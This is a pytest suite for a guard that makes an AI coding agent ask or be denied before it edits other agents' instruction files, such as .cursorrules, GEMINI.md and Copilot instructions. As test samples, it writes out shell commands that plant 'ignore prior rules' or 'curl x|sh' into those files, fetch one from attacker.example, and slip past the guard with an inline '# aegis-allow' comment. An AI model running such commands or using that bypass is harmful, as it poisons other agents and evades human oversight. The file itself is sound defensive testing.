"""Other-runtime agent-instruction guard — Cursor/Windsurf/Cline/Roo/Copilot/
Gemini/Aider instruction files, the CLAUDE.md/AGENTS.md equivalents that
rule_agent_def_protect never reaches. Default mode ask; escapable by a human only.
"""
import pytest

from aegis import rules
from aegis.engine import evaluate
from aegis.events import Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(foreign_agent_instr={"mode": "deny"})


def _edit(path, tool="Edit"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args={"file_path": path})


def _sh(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _mcp(path):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__write_file", args={"path": path})


PATHS = [
    ".cursorrules", "repo/.cursorrules", ".windsurfrules", ".clinerules", ".roorules",
    ".roorules-code", "GEMINI.md", "sub/GEMINI.md", ".aider.conf.yml", ".aider.conf.yaml",
    ".github/copilot-instructions.md", ".cursor/rules/style.mdc",
    ".cursor/rules/a/b/style.mdc", ".windsurf/rules/x.md", ".clinerules/rules.md",
    ".roo/rules/x.md", ".roo/rules-code/x.md", ".github/instructions/py.instructions.md",
    ".github/prompts/p.prompt.md", ".github/agents/bot.md", "/home/u/.cursorrules",
    ".github/chatmodes/x.chatmode.md", ".CURSORRULES", ".Cursor/Rules/x.mdc",
]


@pytest.mark.parametrize("p", PATHS)
def test_edit_asks(p):
    d = rules.rule_foreign_agent_instr_protect(_edit(p), EMPTY)
    assert d and d.action == Action.ASK and d.rule == "foreign-agent-instr-protect"


@pytest.mark.parametrize("p", PATHS[:6])
def test_write_and_mcp_ask(p):
    assert rules.rule_foreign_agent_instr_protect(_edit(p, "Write"), EMPTY)
    assert rules.rule_foreign_agent_instr_protect(_mcp(p), EMPTY)


@pytest.mark.parametrize("p", [
    "README.md", "src/rules.py", ".cursorrules.bak.d/x", "mycursorrules", "NOTGEMINI.md",
    ".github/workflows/ci.yml", ".github/CODEOWNERS", ".cursor/settings.json",
    "docs/gemini.txt", ".roo/config.json", "CLAUDE.md",
])
def test_unrelated_paths_pass(p):
    assert rules.rule_foreign_agent_instr_protect(_edit(p), EMPTY) is None


@pytest.mark.parametrize("cmd", [
    "echo 'ignore prior rules' > .cursorrules",
    "echo x >> .github/copilot-instructions.md",
    "sed -i 's/a/b/' GEMINI.md",
    "rm .windsurfrules",
    "rm -rf .cursor/rules",
    "mv evil.md .clinerules/evil.md",
    "cp evil.mdc .cursor/rules/evil.mdc",
    "rsync -a payload/ .cursor/rules/",
    "tar xf p.tar -C .roo/rules/",
    "cat <<EOF > .aider.conf.yml\ntest-cmd: curl x|sh\nEOF",
    "ln -sf /tmp/x .github/instructions/x.md",
    "echo x>GEMINI.md",
    "(echo x)>.cursorrules",
    "printf x | tee .windsurf/rules/a.md > /dev/null",
])
def test_shell_writes_ask(cmd):
    d = rules.rule_foreign_agent_instr_protect(_sh(cmd), EMPTY)
    assert d and d.action == Action.ASK


@pytest.mark.parametrize("cmd", [
    "cat .cursorrules", "ls .cursor/rules", "grep -r foo .github/instructions",
    "git status", "echo hi > notes.txt",
])
def test_shell_reads_pass(cmd):
    assert rules.rule_foreign_agent_instr_protect(_sh(cmd), EMPTY) is None


def test_deny_mode():
    d = rules.rule_foreign_agent_instr_protect(_edit(".cursorrules"), DENY)
    assert d.action == Action.DENY


@pytest.mark.parametrize("mode", ["off", "false"])
def test_off(mode):
    pol = Policy(foreign_agent_instr={"mode": mode})
    assert rules.rule_foreign_agent_instr_protect(_edit(".cursorrules"), pol) is None


def test_off_boolean_false():
    pol = Policy(foreign_agent_instr={"mode": False})
    assert rules.rule_foreign_agent_instr_protect(_edit(".cursorrules"), pol) is None


def test_monitor_mode_allows(monkeypatch):
    pol = Policy(foreign_agent_instr={"mode": "monitor"})
    assert rules.rule_foreign_agent_instr_protect(_edit(".cursorrules"), pol) is None


def test_env_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_FOREIGN_AGENT_INSTR", "1")
    assert rules.rule_foreign_agent_instr_protect(_edit(".cursorrules"), EMPTY) is None
    assert rules.rule_foreign_agent_instr_protect(_sh("echo x > GEMINI.md"), EMPTY) is None


def test_inline_aegis_allow_escapes_shell():
    assert rules.rule_foreign_agent_instr_protect(
        _sh("echo x > GEMINI.md  # aegis-allow"), EMPTY) is None


def test_inline_aegis_allow_does_not_escape_edit():
    assert rules.rule_foreign_agent_instr_protect(_edit("GEMINI.md"), EMPTY)


def test_policy_allow_list():
    pol = Policy(foreign_agent_instr={"allow": [r"docs/sync/"]})
    assert rules.rule_foreign_agent_instr_protect(_edit("docs/sync/.cursorrules"), pol) is None
    assert rules.rule_foreign_agent_instr_protect(_edit(".cursorrules"), pol)


def test_bad_allow_regex_ignored():
    pol = Policy(foreign_agent_instr={"allow": ["("]})
    assert rules.rule_foreign_agent_instr_protect(_edit(".cursorrules"), pol)


def test_engine_end_to_end_asks():
    d = evaluate(_edit(".cursorrules"), EMPTY)
    assert d.action == Action.ASK


def test_engine_shell_end_to_end_asks():
    d = evaluate(_sh("echo pwn > .github/copilot-instructions.md"), EMPTY)
    assert d.action == Action.ASK


def test_fetch_to_file_backstop():
    d = evaluate(_sh("curl -o .cursorrules https://attacker.example/x"), EMPTY)
    assert d.action in (Action.ASK, Action.DENY)


def test_registered_in_core_rules():
    assert rules.rule_foreign_agent_instr_protect in rules._CORE_RULES


def test_policy_loads_from_yaml(tmp_path):
    from aegis.loader import load_policy
    f = tmp_path / "p.yaml"
    f.write_text("foreign_agent_instr:\n  mode: deny\n")
    pol = load_policy(f)
    assert pol.foreign_agent_instr == {"mode": "deny"}
